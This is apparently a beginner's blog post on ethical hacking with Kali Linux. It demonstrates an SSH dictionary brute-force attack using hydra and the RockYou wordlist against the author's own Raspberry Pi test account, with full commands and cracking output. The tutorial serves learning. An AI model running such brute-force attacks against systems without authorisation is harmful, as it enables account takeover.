---
title: Introduction to Ethical Hacking
date: 2023-03-26 18:28:17 +03:00
tags: [introduction, "ethical hacking", hacking, kali, linux, "brute-force attack"]
description: This blog post will introduce ethical hacking with Kali Linux. We'll define ethical hacking, discuss Kali Linux, and cover basic techniques such as reconnaissance and vulnerability scanning. By the end, readers will have a better understanding of using Kali Linux as a tool in ethical hacking.
image: /ethical-hacking-intro/ethical-hacking-intro-cover.png
---

# Ethical Hacking

In this series of blog posts, let me walk you through a path of a beginning
ethical hacker. It's mainly meant for me to learn, but I will be happy if this
helps someone else to get down on the path of an ethical hacker as well.

## Kali Linux

Kali Linux is a Linux distribution that comes with a set of tools useful for
ethical hacking. Go ahead and install it, preferably in a virtual machine.

Follow the [official website][1] to install the Kali Linux.

[1]: https://www.kali.org/

## SSH Brute-Force Dictionary Attack

Instead of trying manually one password after another, let's automate that
process. We will create a list of possible passwords and pass that list to a
smart program that will try all those passwords for us.

On Kali Linux there is a program called `hydra`. Kali Linux also comes with a
list of possible passwords - RockYou list [2] (comes from the incident in 2009).
The file is located in `/usr/share/wordlists/rockyou.txt.gz` and contains 14
million records. We will use this list to crack a Linux user account.

First of all unzip the file with passwords (also called a dictionary).

`gunzip /usr/share/wordlists/rockyou.txt.gz`

> You can try to find your passwords in the list using `grep`. If you find some
> of them there, then it would be the best to change those immediately.

Now let's use the `hydra` to crack the password. For testing purposes I have
created on my Raspberry Pi 3 new account `dummy` with password `winniethepooh`.

`useradd dummy`

Next, run the `hydra` to crack the password. This time we are not going to crack
the username, instead we will pass the username to `hydra` manually to simplify
and speed up the process.

`sudo hydra -l "dummy" -P /usr/share/wordlists/rockyou.txt <ip_address> ssh`

This might take a while, because Linux is trying to slow potentional attacker
down by adding extra timeout when logging in over SSH. After couple moments you
get the first output with statistics:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo hydra -l "dummy" -P /usr/share/wordlists/rockyou.txt pi3 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in
military or secret service organizations, or for illegal purposes (this is
non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-03
13:34:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is
recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
(l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://pi3:22/
[STATUS] 147.00 tries/min, 147 tries in 00:01h, 14344255 to do in 1626:20h, 16
active
```

You can notice in the printout that the current speed is 147 passwords per
minute and the time to finish is 1626 hours (68 days), therefore it might be
better to use smaller dictionary for testing purposes.

I have reduced the dictionary size to 200 records (but included the
`winniethepooh`, to see how it works).

```bash
cat /usr/share/wordlists/rockyou.txt | \
head -n 100000 | \
sort --random-sort | \
head -n 200 | \
sed '1s/.*/winniethepooh/' | \
sort --random-sort > ~/wordlist.txt`
```

Now it is possible to run `hydra` again with the smaller wordlist. After two
minutes at latest we should crack the password.

`sudo hydra -l "dummy" -P ~/wordlist.txt <ip_address> ssh`

After a moment we got the result with correct password.

```bash
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200),
~13 tries per task
[DATA] attacking ssh://pi3:22/
[STATUS] 97.00 tries/min, 97 tries in 00:01h, 104 to do in 00:02h, 16 active
[22][ssh] host: pi3   login: dummy   password: winniethepooh
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-03
14:02:29
```

This was the first introductory blog post about ethical hacking. Thanks for
reading!

[2]: https://en.wikipedia.org/wiki/RockYou